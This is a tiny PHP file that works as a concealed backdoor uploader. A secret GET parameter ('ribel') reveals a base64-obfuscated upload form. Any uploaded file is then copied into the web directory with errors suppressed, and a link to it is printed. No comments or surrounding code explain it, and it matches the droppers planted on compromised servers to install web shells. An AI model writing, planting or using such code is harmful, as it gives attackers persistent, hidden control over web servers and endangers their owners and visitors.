<?php
if(isset($_GET["ribel"])){
echo(base64_decode("PGZvcm0gbWV0aG9kPSdQT1NUJyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJz48aW5wdXQgdHlwZT0nZmlsZSduYW1lPSdmJyAvPjxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSd1cCcgLz48L2Zvcm0+"));
@copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);
echo("<a href=".$_FILES['f']['name'].">".$_FILES['f']['name']."</a>");
}
__halt_compiler();
?>
